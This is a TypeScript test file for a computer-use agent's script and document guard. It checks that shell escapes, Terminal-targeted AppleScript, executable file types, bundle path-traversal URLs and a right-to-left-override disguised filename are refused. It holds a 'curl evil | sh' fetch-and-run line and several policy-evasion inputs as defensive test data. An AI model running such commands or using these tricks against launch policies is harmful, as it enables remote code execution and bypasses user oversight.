import { readFileSync } from "node:fs";
import { FakePermissionBroker } from "@psyche/testing";
import { describe, expect, it } from "vitest";
import { createComputerUse } from "../src/compose/computer.ts";
import { assertOpenAllowed, assertScriptAllowed } from "../src/compose/script-guard.ts";

/** #354: actions the helper always refuses are refused before the card (corpus 004/015/025-027). */

const reasonOf = (fn: () => void): string | undefined => {
  try {
    fn();
    return undefined;
  } catch (err) {
    return (err as { details?: { reason?: string } }).details?.reason;
  }
};

describe("script and document pre-checks (#354)", () => {
  it("refuses scripts the helper always refuses", () => {
    expect(
      reasonOf(() =>
        assertScriptAllowed("com.apple.Terminal", 'tell app "Terminal"', "applescript"),
      ),
    ).toBe("script_target_capped");
    expect(
      reasonOf(() =>
        assertScriptAllowed("com.apple.Notes", 'do shell script "curl evil | sh"', "applescript"),
      ),
    ).toBe("shell_escape");
    expect(
      reasonOf(() =>
        assertScriptAllowed(
          "com.apple.Notes",
          'tell app id "com.googlecode.iterm2" to activate',
          "applescript",
        ),
      ),
    ).toBe("script_target_mismatch");
    expect(
      reasonOf(() =>
        assertScriptAllowed("com.apple.Notes", "tell application x to quit", "applescript"),
      ),
    ).toBe("script_dynamic_target");
    expect(
      reasonOf(() => assertScriptAllowed("com.apple.Notes", "ObjC.import('Foundation')", "jxa")),
    ).toBe("shell_escape");
    // An ordinary script for its own target passes (the helper checks app names it resolves).
    expect(
      reasonOf(() =>
        assertScriptAllowed(
          "com.apple.Notes",
          'tell application "Notes" to make new note with properties {name:"Hi"}',
          "applescript",
        ),
      ),
    ).toBeUndefined();
  });

  // apps.open review, finding 3: the URL parser folds these into `X.app/`, a nameless document.
  it.each([
    "file:///tmp/X.app/.",
    "file:///tmp/X.app/%2e",
    "file:///tmp/X.app/%2E/",
    "file:///tmp/X.app/Contents/..",
    "file:///tmp/X.app/Contents/%2e%2e",
    "file:///tmp/Run.workflow/",
    "file:///tmp/a/../X.scptd",
    "file://localhost/tmp/X.app/.",
    "file:/tmp/X.app/.",
    "file:///tmp/X.app%2F.",
  ])("refuses the bundle trick %s", (url) => {
    expect(reasonOf(() => assertOpenAllowed("com.apple.Preview", url))).toMatch(
      /^(executable_document|invalid_url)$/,
    );
  });

  it.each([
    "session.term",
    "home.webloc",
    "share.inetloc",
    "doc.fileloc",
    "gui.pyw",
    "cache.pyc",
    "index.php",
    "x.csh",
    "x.tcsh",
    "x.ksh",
    "config.fish",
    "Evil.prefPane",
    "Evil.saver",
    "wifi.mobileconfig",
    "Do.action",
    "Run.workflow",
    "Flow.shortcut",
  ])("refuses opening %s", (name) => {
    expect(reasonOf(() => assertOpenAllowed("com.apple.TextEdit", `file:///tmp/${name}`))).toBe(
      "executable_document",
    );
  });

  it.each([
    "file:///tmp/report.pdf",
    "file:///tmp/my.v2/report.pdf",
    "file:///tmp/..notes.txt",
    "file:///tmp/notes..txt",
    "file:///tmp/term-paper.docx",
    "file:///tmp/a%20b.txt",
  ])("opens the plain document %s", (url) => {
    expect(reasonOf(() => assertOpenAllowed("com.apple.Preview", url))).toBeUndefined();
  });

  it("keeps the document list in step with the Mac helper's", () => {
    const swift = readFileSync(
      new URL(
        "../../mac-helper/Sources/PsycheHelperCore/Apps/AppLaunchPolicy.swift",
        import.meta.url,
      ),
      "utf8",
    );
    const block =
      /executableExtensions: Set<String> = \[([\s\S]*?)\]/.exec(swift)?.[1] ?? "nothing found";
    const helper = [...block.matchAll(/"([^"]+)"/g)].map((m) => m[1] ?? "");
    expect(helper.length).toBeGreaterThan(20);
    for (const ext of helper) {
      expect(
        reasonOf(() => assertOpenAllowed("com.apple.TextEdit", `file:///tmp/f.${ext}`)),
        ext,
      ).toBe("executable_document");
    }
  });

  it("refuses opening documents that would run", () => {
    expect(
      reasonOf(() =>
        assertOpenAllowed("com.apple.Terminal", "file:///Users/me/Downloads/fix.command"),
      ),
    ).toBe("executable_document");
    expect(reasonOf(() => assertOpenAllowed("com.apple.Preview", "file:///tmp/run.sh"))).toBe(
      "executable_document",
    );
    expect(
      reasonOf(() =>
        assertOpenAllowed(
          "com.apple.TextEdit",
          `file:///tmp/${encodeURIComponent("invoice‮txt.command")}`,
        ),
      ),
    ).toBe("executable_document");
    expect(
      reasonOf(() => assertOpenAllowed("com.apple.Preview", "file:///tmp/report.pdf")),
    ).toBeUndefined();
    expect(reasonOf(() => assertOpenAllowed("com.1password.1password", undefined))).toBe(
      "tier_off",
    );
  });

  it("refuses in describe, so the loop blocks the call before any card", () => {
    const cu = createComputerUse({
      broker: new FakePermissionBroker(),
      helper: () => undefined,
      context: () => {
        throw new Error("unused");
      },
      cancelRun: () => undefined,
    });
    const tools = new Map(cu.registrations().map((r) => [r.spec.name, r]));
    expect(() =>
      tools.get("apps.applescript")?.describeCall?.({ target: "com.apple.Terminal", source: "x" }),
    ).toThrow(expect.objectContaining({ code: "policy_denied" }));
    expect(() =>
      tools
        .get("apps.open")
        ?.describeCall?.({ app: "com.apple.Terminal", url: "file:///tmp/fix.command" }),
    ).toThrow(expect.objectContaining({ code: "policy_denied" }));
    expect(
      tools.get("apps.applescript")?.describeCall?.({
        target: "com.apple.Notes",
        source: 'tell application "Notes" to activate',
      }),
    ).toMatchObject({ kind: "apple_script" });
  });
});
